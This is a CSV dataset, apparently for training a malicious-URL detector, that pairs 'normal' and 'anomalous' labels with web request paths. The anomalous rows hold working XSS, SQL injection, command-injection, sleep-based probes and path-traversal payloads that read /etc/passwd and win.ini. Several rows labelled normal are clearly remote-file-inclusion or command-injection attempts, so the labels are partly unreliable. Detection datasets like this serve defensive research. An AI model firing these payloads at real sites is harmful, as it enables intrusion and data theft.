label,content
正常,/fot-all/
正常,/00001143/
异常,echo$IFSKVWOUC$((99%2B55))$(echo$IFSKVWOUC)KVWOUC%5C%5C
正常,/scales_static_resource.jsf
正常,/\xc5\x9awi\xc4\x99tokrzyskie/
正常,/fs2004 lago amsterdam schiphol scenery/
正常,/841351930/
异常,&#000060
异常,%3B%20str%3D%24%28echo%20YUQKED%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27
正常,/symbianone/
正常,/gadan11/
正常,/paride/
正常,/bugs_icon/
正常,/q55324883
异常,/cgis/fileseek.cgi?foot=;cat /etc/passwd&head=
异常,/javascript/club.exe
异常,/script/ident/identification.php?path_inc=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/yahoo-sm/
异常,/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+1a00+>>ctdn
正常,/19980626032310/
正常,/lost love and highways 1999/
异常,"""%26%26echo$IFSEOCQFN$((57%2B12))$(echo$IFSEOCQFN)EOCQFN%2F%2F"
异常,%22%3B%20str%3D%24%28echo%20BAQATA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C
异常,<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
正常,/pictures/buttons/file_view_mark.gif
正常,/300 000 verschiedene krawalle - hard drive/
正常,//n7xr_xvv.asp
正常,/ideal-av/
异常,/web/BetaBlockModules/NewestGroupsModule/NewestGroupsModule.php?current_blockmodule_pathXXpathXX
正常,/javascript/www.ini
正常,/f150202b/
正常,/10stro75/
正常,/counterstrike cn hack final seeded by cyphix/
正常,/hiptrip_golf/
正常,/17962_flemming n/
异常,/ad_click.asp?banner_id='
异常,%26%26echo$IFSPFGYCN$((54%2B71))$(echo$IFSPFGYCN)PFGYCN%22
正常,/6428516/
正常,/javascript/find.sql
异常,<BR SIZE="&{alert('XSS')}">
正常,/add_jcarroll/
正常,/menu-sitenews/
正常,/tutkimus/
正常,/javascript/warez.cc
正常,/yapcasia2006tokyolightningtalkdekiruperldebugger/
正常,/dev016289/
正常,/18331508/
正常,/resources/js/jquery-ui.js?_=1331998761091
正常,/rf_overview/
正常,/top_02/
异常,/top.php?stuff="\x0asleep 9 #
正常,/127263/
正常,/4228410/
正常,/clear.php?bibtexrootrel=http://cirt.net/rfiinc.txt??
正常,/000062188/
正常,/l3 image calendar lingerie edition v6/
正常,/advanced_comment_system/index.php?acs_path=http://192.168.202.96:8080/vir0v3xfc??
异常,/144/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
异常,<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
正常,/javascript/w.config
正常,/misterx/
正常,/tnc_program/
正常,/shuttle_safety/
正常,/iar embedded workbench for atmel avr v3/
正常,/animatsuri2/
正常,/aboutwhitenew/
正常,/info_more/
正常,/index.php?plugin=http://192.168.202.118:8080/2aibfaczmac8?
异常,/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
异常,%7C%20%5B%201%20-ne%20%24%28echo%20FPMDOL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23
正常,/thegrowthofa/
异常,<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
异常,/o1zj4u9v.cfc?<script>document.cookie="testabrn=6368;"</script>
正常,/_theme/breadcrumb.php?rootbase=http://cirt.net/rfiinc.txt?
异常,/ygkjkngd.asp?<script>document.cookie="testnago=4518;"</script>
异常,&&echo%20GKEMGA$((51%2B90))$(echo%20GKEMGA)GKEMGA|
正常,/274629/
正常,/875092/
正常,/1652881/
异常,/components/com_mambowiki/MamboLogin.php?IP=XXpathXX?
正常,/1668821/
异常,%2522%0A%20str%3D%24%28echo%20YQOMCI%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C
异常,/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=joxad2rlaixd6tbdj
正常,/boardmembers/
正常,/138196/
正常,/brotator/
正常,/docs/config/cluster-membership.html
正常,/javascript/_common.sfish
正常,/ws7pasa_t1c/
正常,/javascript/hardcore.xls
异常,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>"
正常,/javascript/root.key
正常,/piracy_whoare/
正常,/link_main.php?phpbb_root_path=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/150218/
正常,/theme/test6.php?root=http://cirt.net/rfiinc.txt?
正常,/mzk4nzm2/
正常,/picayuneitem/
异常,%22%7C%20%5B%201%20-ne%20%24%28echo%20PMDMJZ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C
正常,/biohazard sound chronicles best track box/
异常,/javascript/dvd.exe
异常,""";echo%20EXOUDI$((91%2B14))$(echo%20EXOUDI)EXOUDI%2F%2F"
正常,/790d5fbfee/
异常,/kpscripts/
异常,/d7ktpmcq.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/main.php?stuff='\x0ddel\x09q61875212\x09#
正常,/changepassword/
正常,/200573/
正常,/javascript/ietf.sh
正常,/nursery-bedding_w0qqfromzr4qqsacatz20416qqsocmdzlistingitemlist/
异常,<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
异常,/recordings/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>
正常,/000048186/
正常,/sridatta/
正常,/t1800-50/
正常,/examples/jsp/jsp2/el/basic-arithmetic.jsp.bak
异常,/wps/wcm/webinterface/login/login.jsp?"><script>alert("ibm_login_qs_xss.nasl-1331909177")</script>
正常,/lib/classes/swift/mime/header.php.tmp
正常,/560071/
异常,/scripts/wpnbr.dll
异常,"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
正常,/searchguide/
异常,;/usr/bin/id\n
正常,/phpmyadmin/1331904201-ror_session_fixation.nasl
异常,/examples/jsp/checkbox/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd
正常,/feature_datacard/
正常,/javascript/dialogs.fcgi
异常,location=location.hash.slice(1);
正常,/website-windows/
异常,&echo%20FQACTW$((22%2B3))$(echo%20FQACTW)FQACTW\
异常,echo$IFSBLWDWQ$((23%2B19))$(echo$IFSBLWDWQ)BLWDWQ\
异常,/0qhcnefz.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/die roten rosen - wir warten aufs christkind/
异常,/phplib/version/1.3.3/module/hg_referenz_jobgalerie.php?tt_docroot=XXpathXX
正常,/mobile.php
正常,/tscmsequence/
正常,/compliancenow/
正常,/dublilns/
异常,/u95h6ymu.asp?<script>document.cookie="testkhwc=4028;"</script>
异常,/?<script>document.cookie="testquyx=2820;"</script>
异常,/recordings/carbo.dll?icatcommand=..\..\..\..\..\..\winnt\win.ini&catalogname=catalog
正常,/art of noise - the ambient collection/
正常,/javascript/trees.part
异常,//<body><script/src="http://www.example.com/test?rnd=q45644755"></script>
正常,/javascript/voip.csv
正常,/104218/
异常,/cacti/netauth.cgi?cmd=show&page=../../../../../../../../../etc/passwd
异常,"/myhome/template/default/pinkstyle.css/topics.php?op=viewtopic&topic=-1+Union+select+1,2,3,md5(7)"
异常,%7C%20%5B%203%20-ne%20%24%28echo%20RUNALC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C
正常,/korg legacy collection digital edition iso/
正常,/javascript/shares.out
正常,/lucid discrepancy - live accoustic/
正常,/110403/
正常,/post-14289/
正常,/news85213561/
正常,/cgi-bin/shop.plx/page=nessus244430729
异常,/aj3pf49c.pl?<meta http-equiv=set-cookie content="testnofv=4170">
正常,/128424/
正常,/cgi-bin/wsisa.dll/wservice=wsbroker1/webutil/ping.p
正常,/bluelinedash/
正常,/nikki bent over couch and fucked hard in ass and pussy/
正常,/720026/
异常,/ywaxntrx.fts?<script>cross_site_scripting.nasl</script>
正常,/emuseum/
正常,/gfimailarchiveroverview/
正常,/examples/jsp/colors/acp/lib/inserts.sql
异常,/cgis/cgi-test.exe
异常,%7C%20%5B%209%20-ne%20%24%28echo%20HHUNZT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526
正常,/m_destaque1/
正常,/javascript/synapse.asp
异常,/webcgi/msmmask.exe?mask=/junk334
正常,/fidc077e4e47d094604ac20ecfde329a86f25dbeb80/
正常,/mypinnacle/
正常,/04strategy/
正常,/koalas/
正常,/joining-mil/
正常,/screengrab_109/
正常,/examples/servlets/servlet/misc.php?action=login
异常,/6wb70v0b.htm?<script>cross_site_scripting.nasl</script>
异常,%0A%20str%3D%24%28echo%20GOUIRV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20
正常,/javascript/go.lib
正常,/main.php?stuff=&del\x09q82426871&rem\x09
异常,%22%7C%20%5B%201%20-ne%20%24%28echo%20FATRPK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22
正常,/nl-signup/
异常,""")print(`echo%20ADFEOJ%0aecho%20$((67%2B57))%0aecho%20ADFEOJ%0aecho%20ADFEOJ`)%3B.%252527ADFEOJ"
正常,/pfsysinfo/
正常,/fid382b7f2bfb6f73d38b62b68410ca36d0f395890f/
异常,/wp-login.php?action=-8630%25%27%20UNION%20ALL%20SELECT%203373%2C%203373%2C%203373%2C%203373%2C%203373--%20
正常,/for_arovaxshield/
正常,/617685/
异常,/top.php?stuff="del\x09q12423295&rem\x09
正常,/load_balancers/
正常,/naboard_pnr.php?skin=http://192.168.202.118:8080/zz5thkvtmlgl??
正常,/bittorrent_21737/
正常,/ps2-breath of fire dragon quarter pal/
正常,/vienna/
正常,/msg03802/
异常,/scripts/event_view.php?eid=34 union select 1574505941
异常,/supasite/admin_topics.php?supa[db_path]=XXpathXX
正常,/t_knts/
异常,/rbec2ohx.idc?<script>cross_site_scripting.nasl</script>
正常,/aajanews/
正常,/hr_p135/
正常,/en-us/account/login?return_to=/en-us/app/launcher/home
正常,/recordings/api/orders.json?search[instance_eval]=kernel.fail `id`
异常,<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
正常,/eb39a8cbe7f4bba663538ed2ef0b0de1/
异常,<iframe/*%%%%25%%%25*/src='javascript:vbscript:%0b%0a/**/;//:http://www.google.com/?=%0a/**/javascript:%0a/*oleeeeeeeeeeeeeee*/alert(2);'>
异常,%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C
正常,/b_link/
异常,/javascript/limit.exe
异常,/apavxugx.cfc?<script>document.cookie="testdnbh=5237;"</script>
异常,/..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1../winnt/system32/cmd.exe?/c+dir+c:\+/og
正常,/upload.php?save_path=@rfiurl?save_path=@rfiurl?
正常,/database-options/
正常,/f211002r/
正常,/fiddcdf839729460252580adda3d85c1e5ff9f45050/
异常,/oie504mr.nsf?<script>document.cookie="testtpby=7052;"</script>
正常,/javascript/counter.jsp
正常,/ch_readalso.php?read_xml_include=http://192.168.202.96:8080/txenjrxf3?
异常,/scripts/catalog.php?action=category_show&id='
正常,/cross.php?url=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/031620/
正常,/javascript/em.jsf
正常,/167591/
正常,/phish060212b/
正常,/subscribedlinks/
异常,/?1=;alert(1);//
正常,/javascript/todo.cgi
异常,/v3axg1p8.html?<script>document.cookie="testxagh=6987;"</script>
正常,/stocktonsent/
异常,/examples/jsp/jsp2/el/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1
正常,/pblang/
异常,"""><script>alert(1)</script>"
正常,/ports11900to11999/
正常,/1583105048/
正常,/0357208/
正常,/javascript/image.tmp
正常,/javascript/survey.c
正常,/167725/
正常,/featuring/
异常,/vjbrrppi.jsp?<script>cross_site_scripting.nasl</script>
正常,/examples/jsp/jsp2/jspx/forumdata/data/user.idx
正常,/273888/
异常,<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
正常,/index.php?may=http://cirt.net/rfiinc.txt?
正常,/javascript/_common.jhtml
正常,/index.php?templates_dir=http://192.168.202.96:8080/4dckqcc0acprbz??
异常,&echo$IFSPTGUJI$((21%2B75))$(echo$IFSPTGUJI)PTGUJI|
正常,/1590596234/
正常,/examples/jsp/jsp2/el/basic-arithmetic.jsp.1
正常,/common/db.php?commonpath=http://cirt.net/rfiinc.txt??
异常,%3Becho$IFSDXMRQT$((52%2B34))$(echo$IFSDXMRQT)DXMRQT\
正常,/firstamendmentpress/
异常,;echo%20UWAPJX$((78%2B84))$(echo%20UWAPJX)UWAPJX&
正常,/javascript/ms-sql.csproj
正常,/tips_tricks/
正常,/ip.inc.php?type=1&cgipath=http://192.168.202.118:8080/2aibfaczmac8?
正常,/operation hardcore-nordcore 5 the point of no return/
异常,/t578vqea.cgi?<script>document.cookie="testsory=7676;"</script>
正常,/kaffeine/
正常,/en-us/manager/windows/apps/local/windows/windows
异常,%0A%20str%3D%24%28echo%20FUFPKN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F
正常,/uwp student masturbating on webcam/
正常,/14opconnection_1/
正常,/enmusicapi/
正常,/77df0e0796b84010vgnvcm1000004eecbccdrcrd/
正常,/eire_flag/
异常,<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
正常,/140136/
正常,/shoutbox.php?language=http://192.168.202.118:8080/ghl9il?
异常,/icon_transcript/
正常,/bumfights 3 the felony files 2004 dvdrip/
正常,/common.inc.php?cfg[libdir]=@rfiurl?cfg[libdir]=@rfiurl?
正常,/ab2/\@adminaddadmin?password=bar&re_password=bar&uid=foo
异常,%3Becho%20FAHQNN$((39%2B84))$(echo%20FAHQNN)FAHQNN%26
异常,/yk10/?page=-4890%27%20UNION%20ALL%20SELECT%207811%2C%207811%2C%207811%2C%207811--%20
正常,/011aa6blues/
正常,/salon_logo/
异常,<svg id=1 onload=confirm(1)> 
正常,/logo_antikeylog/
正常,/000136/
异常,/egaet53a.jspa?<script>cross_site_scripting.nasl</script>
异常,ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
正常,/1909136068/
正常,/613765-weblogo/
异常,<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
正常,/duckman 311-320/
正常,/fc7themeproposalflyinghighfedoragnomelogin/
异常,%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20NSNYEU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C
正常,/187061/
正常,/manager/tst.bat|type c:\windows\win.ini
正常,/javascript/jboss.pl
正常,/mary chapin carpenter - come on come on mp3/
异常,/75/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
异常,/nmw0do67.dll?<script>cross_site_scripting.nasl</script>
异常,/0u75ldxq.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/config.php?incpath=XXpathXX
异常,/en-us/odzk29aa.php?<meta http-equiv=set-cookie content="testtfvh=2141">
异常,/cgi-exe/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
异常,<img src=/ onerror=alert(1)>
异常,/uc/avatar.php?uid=4483%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20
正常,/000022725/
正常,/shred-it/
异常,/cgi-915/fileseek2.cgi?foot=&head=;cat /etc/passwd|
正常,/index_2001/
正常,/fided67c7415ed630c4a64fabd79c4ba38d8c617d7e/
正常,/137034/
正常,/index2.php?s=http://cirt.net/rfiinc.txt?
正常,/lib/classes/swift/plugins/loggerplugin.php.~1~
异常,/10191/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
异常,/help.php?q="&ping\x09-w\x098000\x09-n\x091\x094.3.2.1&rem\x09
异常,%3B%20str%3D%24%28echo%20SXGXTS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%26
正常,/1221kinderharassment21-on/
正常,/site/iissamples/
正常,/gnupg-2/
正常,/oklahoma-news/
正常,/121169/
正常,/examples/jsp/checkbox/settings/site.ini
正常,/ennes1952/
正常,/061009_securitypodcast/
异常,/javascript/developer.exe
异常,/main.php?logout="\x0arm q92897682 #
正常,/issue4_11/
正常,/038218/
正常,/javascript/footers.vb
正常,/javascript/cfm.7z
正常,/clearshim/
正常,/fidc61f34591775b19c5b862538d021f91fed650ae2/
异常,/<script>document.cookie="testfuqi=4189;"</script>
异常,%2522%3B%20str%3D%24%28echo%20IVNSBH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522
异常,/javascript/document.cfm
正常,/121006_brangelinanyc/
异常,/60/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
异常,/cgi/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
正常,/687474702s7777772r7765622r66726565726o2r636s6q2s632s796561682r6n7067/
正常,/3777042/
正常,/searchbox_ll/
正常,/essential mix-victor serene 12 tribes mix/
异常,<a href='vbscript:"&#x5c&quot&confirm(1)&#39&#39"'>
异常,%3B%20str%3D%24%28echo%20XSKPXU%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//
正常,/1821385163/
正常,/languagelinks/
正常,/188270/
异常,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
异常,/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.28.202/&frm_user=&scr_height=q24745466&scr_width=
正常,/df1afe171ec277354a2564dc00094e26/
异常, onload CDATA "alert(2)">
异常,/h4bi26jd.do?<script>document.cookie="testhrzx=1150;"</script>
正常,/examples/jsp/jsp2/simpletag/helloworldsimpletag.java.html
正常,/includes/functions_portal.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
正常,/precision_desktop/
正常,/administratorfaq/
正常,/cvs/root
异常,/wp-login.php?action=lostpassword%29%20ORDER%20BY%201--%20
正常,/dix.php3?url_phpartenaire=http://192.168.202.96:8080/swgnhpydbq0t?
正常,/volume.php?config[public_dir]=http://192.168.202.118:8080/ghl9il??
正常,/175710/
正常,/sezhoo/sezhootabsandactions.php?ip=@rfiurl
正常,/skateboarding_shoe/
正常,/_w0qqfromzr4qqfsooz1qqfsopz1qqsacatz63568qqsocmdzlistingitemlist/
异常,%27%7Cecho$IFSWNRKQX$((15%2B90))$(echo$IFSWNRKQX)WNRKQX"
异常,"""><style type=text/less>a{b:`function(){alert(1)}()`;}</style>"
正常,/artlist.php?root_path=http://192.168.202.118:8080/2aibfaczmac8?
异常,/scripts/fake.cgi?arg=/../../../../../windows/win.ini
异常,%22%3Becho%20YEWKQB$((93%2B41))$(echo%20YEWKQB)YEWKQB"
正常,/examples/jsp/cal/psunami.cgi?file=|id|
异常,/l752x1ry.fts?<script>cross_site_scripting.nasl</script>
异常,/en-us/ddoworrl.idc?<meta http-equiv=set-cookie content="testvlau=8517">
异常,/phpmyadmin/documentation.html?phpmyadmin=csc3t31gos8q2h30o9cfk567d1lu5go1;/usr/bin/id
异常,/examples/jsp/colors/cgiwrap/cgiwrap_error_page_handling_xss.nasl
正常,/simpleencryptor/
正常,/mytob worm and its variants removal 5/
正常,/dc10-vanginkel/
正常,/coin-button_01/
异常,/examples/jsp/jsp2/el/search/results.stm?indexname=>"><script>foo</script>&style=fancy&spage=60&query=folder name
正常,/javascript/promo.lib
正常,/blockad1/
正常,/include/misc/mod_2checkout/2checkout_return.inc.php?dir=@rfiurl
异常,/3j8echh0.cfc?<meta http-equiv=set-cookie content="testfuqi=4189">
正常,/196601031/
正常,/extincao/
正常,/login.php?langfile=http://192.168.202.118:8080/ghl9il?
异常,/75/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
正常,/getsource/
正常,/az_sgi42c4gxhcmg2hkdmurhuew34sgujtx/
异常,/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://192.168.202.118:8080/ghl9il?
正常,/admin/st_countries.php?include_path=http://cirt.net/rfiinc.txt??
异常,/cgi-bin/more.php?id=1'
正常,/0b56e22e92a089003a91e3fdb4f51983-6/
正常,/javascript/personal.pm
正常,/javascript/replication.sh
异常,/egaet53a.fts?<script>cross_site_scripting.nasl</script>
异常,/zcb/?page=2%25%27%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20
异常,/?4368=%22%20onchange=alert(1)%20a%22
正常,/kajol1/
正常,/portaldeptsprogramaction/
正常,/0471444499/
正常,/sbssetupbestpractices/
正常,/enth3/show_joined.php?path=http://192.168.202.96:8080/no4ghqiguzhst?
异常,/javascript/ignore.exe
异常,/config.inc.php?path_escape=XXpathXX
正常,/libraries/database.php?path=@rfiurl???path=@rfiurl???
正常,/indexinfo.php?bibtexrootrel=http://cirt.net/rfiinc.txt??
异常,/top.php?stuff="\x0adel q36232773 #
异常,"/scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- "
正常,/130_a35-3/
正常,/recordings/theme/struts/webconsole.html
异常,<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
正常,/552492279fhojeu/
正常,/126749/
正常,/drhcprxk.pw
正常,/page58/
正常,/yrch/plugins/metasearch/plug.inc.php?path=@rfiurl
正常,/executive diamond attitude - dean kosage/
正常,/urlinn_includes/config.php?dir_ws=http://cirt.net/rfiinc.txt??
正常,/(tusdivx) hyper police dvdrip dual completa/
正常,/msg00260/
正常,/zend_cache/
正常,/index1810/
异常,/en-us/account/manager/media/browser/mcpuk/connectors/php/commands/thumbnail.php?base_path=/etc/passwd\x00
正常,/coxslotmotor/
异常,"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a"
正常,/goaway/
正常,/fips-102f/
正常,/136277/
异常,"/uc/avatar.php/topics.php?op=viewtopic&topic=-1+Union+select+1,2,3,md5(7)"
正常,/emifile1158/
正常,/jpla-4vgune/
正常,/sugushi/
正常,/javascript/fonts.o
正常,/msg669799/
异常,%7C%20%5B%209%20-ne%20%24%28echo%20SKWMFK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526
正常,/hpwren_l/
正常,/bryan adams - waking up the neighbours/
正常,/moonlight adobe premiere export plugins v1/
正常,/378521/
正常,/opshop/
正常,/001838/
正常,/lib/armygame.php?libpath=http://192.168.202.118:8080/tzhfyzkbomspvm?
异常,/d44uk9h2.cfm?<script>document.cookie="testmybc=2088;"</script>
异常,/phpmyadmin/help/index.php?help_file=../../../../../../../../../../../etc/passwd
正常,/ozric tentacles - tantric obstacles/
正常,/1165418008_20354784379c/
正常,/javascript/find.part
异常,/javascript/mp3s.exe
正常,/javascript/hta.error
正常,/wsk/wsk.php?wsk=http://192.168.202.118:8080/tzhfyzkbomspvm?
异常,>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;confirm(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
正常,/procmailrc/
正常,/855940442/
正常,/a4012985/
正常,/examples/jsp/plugin/plugin.jsp.copy
异常,/tocvirusdescriptions/
异常,/<script>document.cookie="testsbvw=6289;"</script>
异常,/inc/download_center_lite.inc.php?script_root=http://192.168.202.118:8080/2aibfaczmac8?
正常,/default_jpn/
异常,%22%3Becho%20PZXCGX$((34%2B78))$(echo%20PZXCGX)PZXCGX%2F%2F
正常,/damico/
正常,/my friends hot mom - miss ava devine/
异常,/scripts/lpzj75ztw9lb.html
正常,/189588/
正常,/20040114-7/
正常,/divx codec plasma alpha build 1408/
异常,<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
正常,/javascript/de.save
正常,/examples/jsp/num/ideabox/include.php?ideadir=http://xxxxxxxx
正常,/msg27525012/
正常,/a2417799/
异常,/10191/api.php?op=video_api&pc_hash=1&uid=1&snid=1122%22%20onmouseover=alert(42873)//&do_complete=1
正常,/greenregschool/
异常,&#x00003C
正常,/pc_kotor2/
正常,/adult and underground comics - omaha the cat dancer pack/
正常,/skin-care_w0qqloglz0qqsacatz11863qqsargnzsalisqqsocmdzlistingitemlist/
正常,/622eb65c0300fe2074f668d311faf0567bf7fb04/
异常,/././././././../../../../../winnt/win.ini
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20BFQFHB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23
正常,/industry_technology/
正常,/javascript/seed.bin
正常,/video-games_w0qqloglz0qqsacatz1249qqsargnzsalisqqsocmdzlistingitemlist/
异常,/scripts/yfmo7jpwvpv1.shtml
正常,/currentissues_banner/
正常,/img_7934/
正常,/manager/vhost.php?action=logout&time=1331904332
正常,/dlyh-5n3gm4/
正常,/phpmyadmin/nx/common/cds/menu.inc.php?c_path=http://xxxxxxxx/
异常,/help.php?q="&rm\x0bq72412482&rem\x0b
正常,/e56ed60e3af41336b1c683d565e7bb2b/
正常,/038665/
异常,/examples/jsp/colors/notify?from=nessus"|id"
正常,/bsplayer pro v1/
正常,/doc-9697429/
正常,/dungeons and dragons - expanded psionics handbook/
异常,/main.php?stuff=;rm q23784271 #
正常,/coreldraw/
异常,/eclxssapp/
正常,/easeus datarecoverywizard_information/
